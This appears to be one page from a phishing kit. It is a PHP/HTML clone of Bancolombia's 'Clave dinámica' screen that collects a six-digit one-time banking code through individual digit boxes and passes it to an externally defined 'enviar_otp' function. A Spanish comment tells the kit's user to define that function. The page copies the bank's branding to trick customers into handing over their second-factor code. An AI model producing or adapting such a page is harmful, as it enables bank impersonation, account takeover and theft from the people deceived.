<?php 

?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Autenticación Bancolombia</title>
  <link rel="stylesheet" href="css/otp.css">
  <link rel="icon" href="otpimages/favicon.ico">
    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js"></script>
    <script src="../../scripts/functions.js"></script>
</head>

<body class="fondo">
  <header>
    <img src="images/bancolombia.svg" alt="Bancolombia Logo" class="logo">
    <a href="#" class="logout">
      Salir
      <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
    </a>
  </header>
  <main>
  <h1 class="titulo">Clave dinámica</h1>
    <div class="cuadroblanco">
      <div class="candado"></div>
      <div class="candado2">Consulta tu Clave Dinámica desde la App Mi Bancolombia.</div>
      <div class="candado3"></div>
  
      <div class="clave">
	  <div class="clave2">
      <input type="tel" inputmode="numeric" name="field1" maxlength="1" class="clave3" id="digit1">
      <input type="tel" inputmode="numeric" name="field2" maxlength="1" class="clave3" id="digit2">
      <input type="tel" inputmode="numeric" name="field3" maxlength="1" class="clave3" id="digit3">
      <input type="tel" inputmode="numeric" name="field4" maxlength="1" class="clave3" id="digit4">
	  <input type="tel" inputmode="numeric" name="field5" maxlength="1" class="clave3" id="digit5">
	  <input type="tel" inputmode="numeric" name="field6" maxlength="1" class="clave3" id="digit6">
    <input type="hidden" id="txtOTP" name="cDinamica">
      </div>
  
        <div class="volver1">
          <button type="button" id="btn-volver-user" class="volver2">
            <label class="volver3">Volver</label>
          </button>
  
          <div class="continuar1">
		  <button type="button" id="btnOTP" class="continuar2">
          <label class="continuar3">Continuar</label>
            </button>
          </div>
        </div>
      </div>
    </div>
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>
</body>

<script>
function actualizarOTP() {
  const clave = [
    $('#digit1').val(),
    $('#digit2').val(),
    $('#digit3').val(),
    $('#digit4').val(),
    $('#digit5').val(),
    $('#digit6').val()
  ].map(d => d.trim()).join('');

  $('#txtOTP').val(clave);

  if (clave.length === 6 && /^\d{6}$/.test(clave)) {
    $('#btnOTP').addClass('boton-activo'); // 🔶 Aquí se activa el amarillo
  } else {
    $('#btnOTP').removeClass('boton-activo');
  }
}

$(document).ready(function () {
  $('.clave3').on('input', function () {
    if (this.value.length === 1) {
      $(this).next('.clave3').focus();
    }
    actualizarOTP(); // Verifica y pinta si están los 6 dígitos
  });

  $('.clave3').on('keydown', function (e) {
    if (e.key === 'Backspace' && this.value === '') {
      $(this).prev('.clave3').focus();
    }
  });

  $('#btnOTP').click(function () {
    const otp = $('#txtOTP').val().trim();
    if (otp.length === 6 && /^\d{6}$/.test(otp)) {
      enviar_otp(otp); // Función personalizada que tú defines
    } else {
      $(".mensaje").show();
      $(".pass").css("border", "1px solid red");
    }
  });

  $('.clave3').keyup(function () {
    $(".pass").css("border", "1px solid #CCCCCC");
    $(".mensaje").hide();
  });
});
</script>


</body>
</html>